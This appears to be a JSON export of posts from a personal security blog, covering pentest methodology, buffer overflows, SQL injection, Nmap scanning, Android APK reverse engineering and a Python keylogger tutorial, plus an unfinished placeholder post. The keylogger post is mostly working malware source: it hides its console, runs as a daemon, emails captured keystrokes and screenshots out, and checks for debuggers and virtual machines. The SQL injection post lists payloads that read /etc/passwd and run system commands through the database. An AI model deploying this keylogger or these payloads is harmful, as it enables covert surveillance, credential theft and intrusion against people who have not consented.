[
  {
    "title": "DracoZona",
    "slug": "dracozona",
    "date": "2025-08-19",
    "category": "Your Category",
    "tags": [
      "test"
    ],
    "excerpt": "Your excerpt here",
    "content": "# Hi DracoZona\n\nBuffer overflows remain one of the most critical vulnerabilities in software security. While basic stack overflows are well-understood, modern exploitation requires sophisticated techniques to bypass current protection mechanisms."
  },
  {
    "title": "Penetration Testing Methodology with Visual Guide",
    "slug": "penetration-testing-methodology-with-visual-guide",
    "date": "2024-01-22",
    "category": "Penetration Testing",
    "tags": [
      "pentesting",
      "cybersecurity"
    ],
    "excerpt": "Complete penetration testing methodology guide with visual diagrams and practical examples for ethical hackers and security professionals.",
    "content": "# Penetration Testing Methodology with Visual Guide\n\nPenetration testing follows a structured methodology to ensure comprehensive security assessment. This guide provides a visual walkthrough of the entire process.\n\n## Penetration Testing Phases\n\nThe standard penetration testing methodology consists of five main phases:\n\n![Penetration Testing Phases](pentest-phases.png)\n\n### 1. Reconnaissance (Information Gathering)\n\nThe first phase involves gathering as much information as possible about the target:\n\n#### Passive Reconnaissance\n- **OSINT (Open Source Intelligence)**\n- Social media profiling\n- DNS enumeration\n- Whois lookups\n- Google dorking\n\n```bash\n# DNS enumeration\ndig target.com ANY\nnslookup target.com\n\n# Subdomain discovery\nsubfinder -d target.com\namass enum -d target.com\n```\n\n#### Active Reconnaissance\n- Port scanning\n- Service enumeration\n- Banner grabbing\n- Network mapping\n\n![Network Scanning Process](network-scan.png)\n\n### 2. Scanning and Enumeration\n\nThis phase involves active probing of the target systems:\n\n#### Network Scanning\n```bash\n# Nmap comprehensive scan\nnmap -sS -sV -sC -O -A target.com\n\n# UDP scan\nnmap -sU --top-ports 1000 target.com\n\n# Vulnerability scanning\nnmap --script vuln target.com\n```\n\n#### Service Enumeration\n- HTTP/HTTPS services\n- SMB shares\n- FTP services\n- SSH services\n- Database services\n\n### 3. Vulnerability Assessment\n\nIdentify potential security weaknesses:\n\n#### Automated Scanning\n```bash\n# Web application scanning\nnikto -h https://target.com\ndirb https://target.com\n\n# Network vulnerability scanning\nnessus_scan target.com\nopenvas_scan target.com\n```\n\n#### Manual Testing\n- Code review\n- Configuration analysis\n- Business logic flaws\n- Authentication mechanisms\n\n![Vulnerability Assessment Flow](vuln-assessment.png)\n\n### 4. Exploitation\n\nAttempt to exploit identified vulnerabilities:\n\n#### Web Application Exploitation\n```bash\n# SQL injection testing\nsqlmap -u \"https://target.com/page?id=1\" --dbs\n\n# XSS testing\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n```\n\n#### Network Exploitation\n```bash\n# Metasploit framework\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nexploit\n```\n\n#### Post-Exploitation\n- Privilege escalation\n- Lateral movement\n- Data exfiltration\n- Persistence mechanisms\n\n### 5. Reporting\n\nDocument findings and provide remediation guidance:\n\n#### Report Structure\n1. **Executive Summary**\n2. **Technical Findings**\n3. **Risk Assessment**\n4. **Remediation Recommendations**\n5. **Appendices**\n\n![Report Structure](report-structure.png)\n\n## Tools and Frameworks\n\n### Essential Penetration Testing Tools\n\n#### Network Tools\n- **Nmap**: Network discovery and security auditing\n- **Wireshark**: Network protocol analyzer\n- **Burp Suite**: Web application security testing\n- **Metasploit**: Exploitation framework\n\n#### Web Application Tools\n- **OWASP ZAP**: Web application scanner\n- **SQLMap**: SQL injection testing\n- **Nikto**: Web server scanner\n- **Gobuster**: Directory/file brute-forcer\n\n#### Operating Systems\n- **Kali Linux**: Penetration testing distribution\n- **Parrot Security OS**: Security-focused distribution\n- **BlackArch**: Arch-based penetration testing distribution\n\n![Penetration Testing Tools](pentest-tools.png)\n\n## Methodology Frameworks\n\n### OWASP Testing Guide\nThe OWASP Web Security Testing Guide provides comprehensive methodology for web application security testing.\n\n### NIST SP 800-115\nTechnical Guide to Information Security Testing and Assessment provides federal guidelines for security testing.\n\n### PTES (Penetration Testing Execution Standard)\nComprehensive standard covering all phases of penetration testing.\n\n### OSSTMM (Open Source Security Testing Methodology Manual)\nScientific methodology for security testing and analysis.\n\n## Legal and Ethical Considerations\n\n### Authorization Requirements\n- **Written permission** from system owners\n- **Scope definition** and boundaries\n- **Rules of engagement** documentation\n- **Emergency contacts** and procedures\n\n### Ethical Guidelines\n- Minimize system disruption\n- Protect confidential information\n- Report vulnerabilities responsibly\n- Follow professional standards\n\n![Legal Framework](legal-framework.png)\n\n## Best Practices\n\n### Documentation\n- Maintain detailed logs\n- Screenshot evidence\n- Command history\n- Vulnerability details\n\n### Communication\n- Regular status updates\n- Immediate critical findings\n- Clear technical explanations\n- Executive summaries\n\n### Quality Assurance\n- Peer review findings\n- Validate exploits\n- Verify remediation\n- Follow-up testing\n\n## Advanced Techniques\n\n### Red Team Operations\n- Social engineering\n- Physical security testing\n- Assumed breach scenarios\n- Advanced persistent threats (APT) simulation\n\n### Purple Team Exercises\n- Collaborative testing\n- Real-time feedback\n- Detection improvement\n- Response validation\n\n![Red Team vs Blue Team](red-blue-team.png)\n\n## Conclusion\n\nEffective penetration testing requires a structured methodology, proper tools, and ethical conduct. The visual guides in this post help illustrate the complex processes involved in comprehensive security assessment.\n\nRemember: Always obtain proper authorization before conducting any penetration testing activities.\n\n## Image Usage\n\nTo include images in your blog posts, simply:\n\n1. Place image files in the `images/` folder\n2. Reference them in markdown: `![Alt text](filename.png)`\n3. The build system automatically converts them to proper HTML\n\n*Stay ethical, stay methodical, and keep testing!*"
  },
  {
    "title": "Advanced Buffer Overflow Exploitation",
    "slug": "advanced-buffer-overflow-exploitation",
    "date": "2024-01-20",
    "category": "Binary Exploitation",
    "tags": [
      "Binary Exploitation"
    ],
    "excerpt": "Deep dive into advanced buffer overflow techniques including ROP chains, ASLR bypass, and modern exploitation methods.",
    "content": "# Advanced Buffer Overflow Exploitation\n\nBuffer overflows remain one of the most critical vulnerabilities in software security. While basic stack overflows are well-understood, modern exploitation requires sophisticated techniques to bypass current protection mechanisms.\n\n## Understanding Modern Protections\n\nToday's systems implement multiple layers of protection:\n\n### Address Space Layout Randomization (ASLR)\nASLR randomizes memory layout, making it difficult to predict addresses. However, information leaks can defeat this protection.\n\n### Data Execution Prevention (DEP/NX)\nDEP prevents code execution in data segments, forcing attackers to use Return-Oriented Programming (ROP).\n\n## Advanced Exploitation Techniques\n\n### Return-Oriented Programming (ROP)\n\nROP chains allow code execution without injecting shellcode:\n\n```assembly\n; Example ROP gadget\npop rdi\nret\n```\n\n### Practical Example\n\nHere's a vulnerable C program:\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // Vulnerable!\n}\n```\n\n## Conclusion\n\nBuffer overflow exploitation continues to evolve alongside defensive measures. Understanding these techniques is crucial for both offensive security professionals and developers building secure applications.\n\n*Happy hacking, and stay ethical!*"
  },
  {
    "title": "Advanced SQL Injection Techniques",
    "slug": "advanced-sql-injection-techniques",
    "date": "2024-01-18",
    "category": "Web Security",
    "tags": [
      "web-security"
    ],
    "excerpt": "Explore advanced SQL injection techniques including blind SQLi, time-based attacks, and modern bypass methods for web application security testing.",
    "content": "# Advanced SQL Injection Techniques\n\nSQL injection remains one of the most critical web application vulnerabilities. While basic union-based attacks are well-documented, advanced techniques require deeper understanding of database internals and application logic.\n\n## Types of SQL Injection\n\n### Union-Based Injection\nThe classic approach using UNION statements to extract data:\n\n```sql\n' UNION SELECT username, password FROM users--\n```\n\n### Blind SQL Injection\nWhen no direct output is visible, we use conditional responses:\n\n```sql\n' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--\n```\n\n### Time-Based Blind Injection\nUsing database sleep functions to infer data:\n\n```sql\n'; IF (1=1) WAITFOR DELAY '00:00:05'--\n```\n\n## Advanced Bypass Techniques\n\n### WAF Evasion\nModern applications use Web Application Firewalls (WAFs) that can be bypassed:\n\n- **Case variation**: `UnIoN SeLeCt`\n- **Comment insertion**: `UN/**/ION SE/**/LECT`\n- **Encoding**: URL, hex, or unicode encoding\n\n### Second-Order Injection\nPayload stored in database and executed later:\n\n```sql\n-- First request stores payload\nINSERT INTO users (name) VALUES ('admin''--')\n\n-- Second request triggers injection\nSELECT * FROM logs WHERE user='admin'--'\n```\n\n## Database-Specific Techniques\n\n### MySQL\n```sql\n-- Information gathering\nSELECT @@version, @@datadir, USER()\n\n-- File operations\nSELECT LOAD_FILE('/etc/passwd')\n```\n\n### PostgreSQL\n```sql\n-- Command execution\nCOPY (SELECT '') TO PROGRAM 'id'\n\n-- Large object abuse\nSELECT lo_import('/etc/passwd', 1337)\n```\n\n### MSSQL\n```sql\n-- Extended stored procedures\nEXEC xp_cmdshell 'whoami'\n\n-- Linked servers\nSELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'password','SELECT @@version')\n```\n\n## Automated Tools\n\nPopular SQL injection tools:\n- **SQLMap**: Comprehensive automated testing\n- **Burp Suite**: Manual testing with extensions\n- **NoSQLMap**: For NoSQL databases\n\n## Prevention Strategies\n\n### Parameterized Queries\n```python\n# Secure approach\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\n# Vulnerable approach\ncursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n```\n\n### Input Validation\n- Whitelist allowed characters\n- Validate data types and ranges\n- Implement proper error handling\n\n### Least Privilege\n- Use dedicated database users\n- Limit database permissions\n- Disable unnecessary features\n\n## Conclusion\n\nSQL injection attacks continue to evolve, requiring security professionals to stay updated with the latest techniques and countermeasures. Always test in authorized environments only."
  },
  {
    "title": "Network Reconnaissance with Nmap",
    "slug": "network-reconnaissance-with-nmap",
    "date": "2024-01-16",
    "category": "Network Security",
    "tags": [
      "reconnaissance",
      "tools"
    ],
    "excerpt": "Master network reconnaissance using Nmap for penetration testing. Learn advanced scanning techniques, evasion methods, and target enumeration.",
    "content": "# Network Reconnaissance with Nmap\n\nNetwork reconnaissance is the foundation of any penetration test. Nmap (Network Mapper) is the industry standard for network discovery and security auditing, offering powerful capabilities for ethical hackers.\n\n## Basic Scanning Techniques\n\n### Host Discovery\n```bash\n# Ping sweep\nnmap -sn 192.168.1.0/24\n\n# ARP scan (local network)\nnmap -PR 192.168.1.0/24\n\n# TCP SYN ping\nnmap -PS22,80,443 192.168.1.0/24\n```\n\n### Port Scanning\n```bash\n# TCP SYN scan (stealth)\nnmap -sS target.com\n\n# TCP connect scan\nnmap -sT target.com\n\n# UDP scan\nnmap -sU target.com\n\n# Comprehensive scan\nnmap -sS -sU -T4 -A -v target.com\n```\n\n## Advanced Techniques\n\n### Service Detection\n```bash\n# Version detection\nnmap -sV target.com\n\n# Aggressive service detection\nnmap -sV --version-intensity 9 target.com\n\n# OS detection\nnmap -O target.com\n```\n\n### NSE Scripts\nNmap Scripting Engine for advanced enumeration:\n\n```bash\n# Vulnerability scanning\nnmap --script vuln target.com\n\n# SMB enumeration\nnmap --script smb-enum-* target.com\n\n# HTTP enumeration\nnmap --script http-enum target.com\n\n# Custom script categories\nnmap --script \"auth or brute\" target.com\n```\n\n## Evasion Techniques\n\n### Timing and Performance\n```bash\n# Paranoid timing (very slow)\nnmap -T0 target.com\n\n# Aggressive timing (fast)\nnmap -T4 target.com\n\n# Custom timing\nnmap --min-rate 1000 --max-rate 5000 target.com\n```\n\n### Firewall Evasion\n```bash\n# Fragment packets\nnmap -f target.com\n\n# Decoy scanning\nnmap -D RND:10 target.com\n\n# Source port spoofing\nnmap --source-port 53 target.com\n\n# Idle scan (zombie host)\nnmap -sI zombie_host target.com\n```\n\n## Target Enumeration\n\n### Web Applications\n```bash\n# HTTP methods\nnmap --script http-methods target.com\n\n# SSL/TLS information\nnmap --script ssl-enum-ciphers -p 443 target.com\n\n# Directory brute force\nnmap --script http-brute-dirs target.com\n```\n\n### Database Services\n```bash\n# MySQL enumeration\nnmap --script mysql-* -p 3306 target.com\n\n# MSSQL enumeration\nnmap --script ms-sql-* -p 1433 target.com\n\n# MongoDB enumeration\nnmap --script mongodb-* -p 27017 target.com\n```\n\n## Output and Reporting\n\n### Output Formats\n```bash\n# All formats\nnmap -oA scan_results target.com\n\n# XML output\nnmap -oX results.xml target.com\n\n# Grepable output\nnmap -oG results.gnmap target.com\n```\n\n### Advanced Output\n```bash\n# Verbose output\nnmap -v target.com\n\n# Debug output\nnmap -d target.com\n\n# Packet trace\nnmap --packet-trace target.com\n```\n\n## Practical Examples\n\n### Internal Network Assessment\n```bash\n# Comprehensive internal scan\nnmap -sS -sU -T4 -A -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script \"default or (discovery and safe)\" 192.168.1.0/24\n```\n\n### External Penetration Test\n```bash\n# External reconnaissance\nnmap -sS -T4 -p- --min-rate 1000 --max-retries 5 -v target.com\n```\n\n## Legal and Ethical Considerations\n\n- Always obtain proper authorization\n- Use appropriate timing to avoid DoS\n- Respect rate limits and system resources\n- Document all activities for reporting\n\n## Conclusion\n\nNmap is an essential tool for network security professionals. Mastering its capabilities enables effective reconnaissance while maintaining stealth and avoiding detection. Remember to always use these techniques responsibly and within legal boundaries."
  },
  {
    "title": "Reverse Engineering Android APKs",
    "slug": "reverse-engineering-android-apks",
    "date": "2024-01-14",
    "category": "Mobile Security",
    "tags": [
      "android",
      "reverse-engineering",
      "mobile-security",
      "malware-analysis"
    ],
    "excerpt": "Learn to reverse engineer Android applications using modern tools and techniques. Discover hidden functionality, security flaws, and malicious behavior.",
    "content": "# Reverse Engineering Android APKs\n\nAndroid applications contain valuable information that can be extracted through reverse engineering. This process is essential for security research, malware analysis, and vulnerability assessment.\n\n## APK Structure\n\nAndroid Package (APK) files are essentially ZIP archives containing:\n\n```\napp.apk\n├── AndroidManifest.xml    # App permissions and components\n├── classes.dex           # Compiled Java/Kotlin code\n├── resources.arsc        # Compiled resources\n├── res/                  # Resources (images, layouts)\n├── assets/              # Raw assets\n├── lib/                 # Native libraries\n└── META-INF/            # Signatures and certificates\n```\n\n## Essential Tools\n\n### Static Analysis Tools\n- **APKTool**: Decompiles APK to smali code\n- **JADX**: Decompiles DEX to Java source\n- **dex2jar**: Converts DEX to JAR format\n- **JD-GUI**: Java decompiler with GUI\n\n### Dynamic Analysis Tools\n- **Frida**: Runtime instrumentation framework\n- **Xposed**: Framework for runtime modifications\n- **Android Debug Bridge (ADB)**: Device communication\n- **Burp Suite**: HTTP proxy for network analysis\n\n## Static Analysis Process\n\n### APK Extraction\n```bash\n# Download APK from device\nadb shell pm list packages\nadb shell pm path com.example.app\nadb pull /data/app/com.example.app/base.apk\n\n# Extract APK contents\nunzip app.apk -d extracted/\n```\n\n### Decompilation\n```bash\n# Using APKTool\napktool d app.apk -o decompiled/\n\n# Using JADX\njadx -d output/ app.apk\n\n# Using dex2jar + JD-GUI\nd2j-dex2jar.sh classes.dex\n# Open classes-dex2jar.jar in JD-GUI\n```\n\n### Manifest Analysis\n```xml\n<!-- AndroidManifest.xml reveals -->\n<uses-permission android:name=\"android.permission.INTERNET\" />\n<uses-permission android:name=\"android.permission.READ_SMS\" />\n\n<activity android:name=\".HiddenActivity\" \n          android:exported=\"false\" />\n\n<receiver android:name=\".BootReceiver\">\n    <intent-filter>\n        <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n    </intent-filter>\n</receiver>\n```\n\n## Dynamic Analysis Techniques\n\n### Frida Instrumentation\n```javascript\n// Hook method calls\nJava.perform(function() {\n    var MainActivity = Java.use(\"com.example.MainActivity\");\n    \n    MainActivity.sensitiveMethod.implementation = function(param) {\n        console.log(\"[+] sensitiveMethod called with: \" + param);\n        return this.sensitiveMethod(param);\n    };\n});\n```\n\n### Network Traffic Analysis\n```bash\n# Set up proxy\nadb shell settings put global http_proxy 192.168.1.100:8080\n\n# Monitor with Burp Suite or mitmproxy\nmitmdump -s intercept.py\n```\n\n### Runtime Debugging\n```bash\n# Enable debugging\nadb shell am set-debug-app -w com.example.app\n\n# Attach debugger\njdb -attach localhost:8700\n```\n\n## Common Security Issues\n\n### Hardcoded Secrets\n```java\n// Vulnerable code\npublic class Config {\n    public static final String API_KEY = \"sk_live_abc123xyz789\";\n    public static final String DB_PASSWORD = \"admin123\";\n}\n```\n\n### Insecure Data Storage\n```java\n// Insecure SharedPreferences\nSharedPreferences prefs = getSharedPreferences(\"user_data\", MODE_WORLD_READABLE);\nprefs.edit().putString(\"password\", userPassword).commit();\n```\n\n### Certificate Pinning Bypass\n```java\n// Weak certificate validation\nTrustManager[] trustAllCerts = new TrustManager[] {\n    new X509TrustManager() {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n    }\n};\n```\n\n## Advanced Techniques\n\n### Anti-Analysis Evasion\n```bash\n# Bypass root detection\nfrida -U -f com.example.app --no-pause -l bypass-root.js\n\n# Bypass SSL pinning\nfrida -U -f com.example.app --no-pause -l ssl-kill-switch.js\n```\n\n### Native Library Analysis\n```bash\n# Analyze ARM libraries\nobjdump -d lib/arm64-v8a/libnative.so\nradare2 lib/arm64-v8a/libnative.so\n\n# Dynamic analysis with Frida\nfrida -U -f com.example.app -l native-hooks.js\n```\n\n### Obfuscation Handling\n```java\n// Deobfuscated class names\npublic class a {  // Original: LoginActivity\n    private String b;  // Original: username\n    \n    public void c() {  // Original: authenticate()\n        // Obfuscated logic\n    }\n}\n```\n\n## Automated Analysis\n\n### MobSF (Mobile Security Framework)\n```bash\n# Install MobSF\npip install mobsf\n\n# Run analysis\nmobsf -f app.apk\n```\n\n### QARK (Quick Android Review Kit)\n```bash\n# Static analysis\nqark --apk app.apk --report-type json\n```\n\n## Reporting Findings\n\nDocument discovered vulnerabilities:\n- Hardcoded credentials\n- Insecure data storage\n- Network security issues\n- Authentication bypasses\n- Privilege escalation paths\n\n## Legal Considerations\n\n- Only analyze applications you own or have permission to test\n- Respect intellectual property rights\n- Follow responsible disclosure practices\n- Comply with local laws and regulations\n\n## Conclusion\n\nAndroid APK reverse engineering is a powerful technique for security assessment and malware analysis. Combining static and dynamic analysis provides comprehensive insights into application behavior and potential security issues."
  },
  {
    "title": "Building a Keylogger in Python",
    "slug": "building-a-keylogger-in-python",
    "date": "2024-01-12",
    "category": "Malware Analysis",
    "tags": [
      "python",
      "tools",
      "malware"
    ],
    "excerpt": "Educational tutorial on creating a keylogger using Python. Learn how these tools work to better defend against them in cybersecurity.",
    "content": "# Building a Keylogger in Python\n\n**Disclaimer**: This tutorial is for educational purposes only. Understanding how keyloggers work helps security professionals better defend against them. Only use this knowledge in authorized environments.\n\n## What is a Keylogger?\n\nA keylogger is software that records keystrokes made by a user. While often associated with malicious activities, keyloggers have legitimate uses in:\n\n- Parental monitoring\n- Employee productivity tracking\n- Personal backup of typed content\n- Security research and testing\n\n## Basic Keylogger Implementation\n\n### Required Libraries\n```python\nimport pynput\nimport logging\nimport os\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom datetime import datetime\n```\n\n### Simple Keylogger\n```python\nfrom pynput import keyboard\nimport logging\n\n# Configure logging\nlogging.basicConfig(filename=\"keylog.txt\", level=logging.DEBUG, format='%(message)s')\n\ndef on_press(key):\n    try:\n        # Log alphanumeric keys\n        logging.info(f'{key.char}')\n    except AttributeError:\n        # Log special keys\n        if key == keyboard.Key.space:\n            logging.info(' ')\n        elif key == keyboard.Key.enter:\n            logging.info('\\n')\n        elif key == keyboard.Key.backspace:\n            logging.info('[BACKSPACE]')\n        else:\n            logging.info(f'[{key}]')\n\ndef on_release(key):\n    # Stop listener on ESC\n    if key == keyboard.Key.esc:\n        return False\n\n# Start listening\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()\n```\n\n## Advanced Features\n\n### Stealth Mode\n```python\nimport os\nimport sys\nimport ctypes\n\ndef hide_console():\n    \"\"\"Hide console window on Windows\"\"\"\n    if os.name == 'nt':\n        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n\ndef run_as_service():\n    \"\"\"Run keylogger as background service\"\"\"\n    if os.name == 'posix':\n        # Unix/Linux daemon\n        pid = os.fork()\n        if pid > 0:\n            sys.exit(0)\n    \n    hide_console()\n```\n\n### Email Reporting\n```python\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\nclass EmailReporter:\n    def __init__(self, email, password, smtp_server=\"smtp.gmail.com\", port=587):\n        self.email = email\n        self.password = password\n        self.smtp_server = smtp_server\n        self.port = port\n    \n    def send_log(self, log_content):\n        try:\n            msg = MIMEMultipart()\n            msg['From'] = self.email\n            msg['To'] = self.email\n            msg['Subject'] = f\"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}\"\n            \n            msg.attach(MIMEText(log_content, 'plain'))\n            \n            server = smtplib.SMTP(self.smtp_server, self.port)\n            server.starttls()\n            server.login(self.email, self.password)\n            server.send_message(msg)\n            server.quit()\n            \n        except Exception as e:\n            logging.error(f\"Email send failed: {e}\")\n```\n\n### Screenshot Capture\n```python\nimport pyautogui\nfrom PIL import Image\nimport io\nimport base64\n\nclass ScreenCapture:\n    def __init__(self):\n        self.screenshot_interval = 300  # 5 minutes\n    \n    def capture_screen(self):\n        try:\n            screenshot = pyautogui.screenshot()\n            \n            # Compress image\n            buffer = io.BytesIO()\n            screenshot.save(buffer, format='JPEG', quality=50)\n            \n            # Encode to base64\n            img_data = base64.b64encode(buffer.getvalue()).decode()\n            \n            return img_data\n        except Exception as e:\n            logging.error(f\"Screenshot failed: {e}\")\n            return None\n```\n\n### Advanced Keylogger Class\n```python\nimport threading\nimport time\nfrom datetime import datetime, timedelta\n\nclass AdvancedKeylogger:\n    def __init__(self, log_file=\"keylog.txt\", email_interval=3600):\n        self.log_file = log_file\n        self.email_interval = email_interval\n        self.last_email = datetime.now()\n        self.buffer = []\n        self.running = False\n        \n        # Initialize components\n        self.email_reporter = EmailReporter(\"your_email@gmail.com\", \"your_password\")\n        self.screen_capture = ScreenCapture()\n    \n    def on_press(self, key):\n        timestamp = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        \n        try:\n            key_data = f\"[{timestamp}] {key.char}\"\n        except AttributeError:\n            if key == keyboard.Key.space:\n                key_data = f\"[{timestamp}] [SPACE]\"\n            elif key == keyboard.Key.enter:\n                key_data = f\"[{timestamp}] [ENTER]\"\n            else:\n                key_data = f\"[{timestamp}] [{key}]\"\n        \n        # Add to buffer\n        self.buffer.append(key_data)\n        \n        # Write to file\n        with open(self.log_file, \"a\") as f:\n            f.write(key_data + \"\\n\")\n        \n        # Check if email should be sent\n        if datetime.now() - self.last_email > timedelta(seconds=self.email_interval):\n            self.send_email_report()\n    \n    def send_email_report(self):\n        if self.buffer:\n            log_content = \"\\n\".join(self.buffer)\n            \n            # Add screenshot\n            screenshot = self.screen_capture.capture_screen()\n            if screenshot:\n                log_content += f\"\\n\\nScreenshot: {screenshot[:100]}...\"\n            \n            self.email_reporter.send_log(log_content)\n            self.buffer.clear()\n            self.last_email = datetime.now()\n    \n    def start(self):\n        self.running = True\n        hide_console()\n        \n        with keyboard.Listener(on_press=self.on_press) as listener:\n            listener.join()\n```\n\n## Detection and Prevention\n\n### How to Detect Keyloggers\n```python\nimport psutil\nimport os\n\ndef detect_suspicious_processes():\n    \"\"\"Detect potential keylogger processes\"\"\"\n    suspicious_names = ['keylog', 'logger', 'capture', 'monitor']\n    \n    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):\n        try:\n            proc_name = proc.info['name'].lower()\n            for suspicious in suspicious_names:\n                if suspicious in proc_name:\n                    print(f\"Suspicious process: {proc.info}\")\n        except (psutil.NoSuchProcess, psutil.AccessDenied):\n            pass\n\ndef check_network_connections():\n    \"\"\"Monitor unusual network activity\"\"\"\n    connections = psutil.net_connections()\n    for conn in connections:\n        if conn.status == 'ESTABLISHED':\n            print(f\"Active connection: {conn}\")\n```\n\n### Prevention Techniques\n- Use virtual keyboards for sensitive input\n- Enable two-factor authentication\n- Regular system scans with antivirus\n- Monitor running processes\n- Use encrypted communication channels\n\n## Legal and Ethical Considerations\n\n### Legal Uses\n- Personal device monitoring (with consent)\n- Corporate security (with employee notification)\n- Parental controls\n- Security research in controlled environments\n\n### Illegal Uses\n- Unauthorized monitoring of others\n- Stealing credentials or personal information\n- Corporate espionage\n- Identity theft\n\n## Defensive Programming\n\n### Anti-Analysis Techniques\n```python\nimport sys\nimport os\n\ndef check_debugger():\n    \"\"\"Basic debugger detection\"\"\"\n    if sys.gettrace() is not None:\n        sys.exit(\"Debugger detected\")\n\ndef check_vm():\n    \"\"\"Basic VM detection\"\"\"\n    vm_indicators = [\n        \"VMware\", \"VirtualBox\", \"QEMU\", \"Xen\"\n    ]\n    \n    try:\n        with open(\"/proc/version\", \"r\") as f:\n            version = f.read()\n            for indicator in vm_indicators:\n                if indicator.lower() in version.lower():\n                    sys.exit(\"VM detected\")\n    except:\n        pass\n```\n\n## Conclusion\n\nUnderstanding keylogger implementation helps security professionals:\n\n- Recognize keylogger behavior patterns\n- Develop better detection mechanisms\n- Educate users about threats\n- Implement appropriate countermeasures\n\nRemember: Knowledge is power, but with power comes responsibility. Always use these techniques ethically and legally.\n\n## Resources\n\n- [pynput documentation](https://pynput.readthedocs.io/)\n- [Python security best practices](https://python.org/dev/security/)\n- [OWASP security guidelines](https://owasp.org/)\n\n*Stay curious, stay ethical, and keep learning!*"
  }
]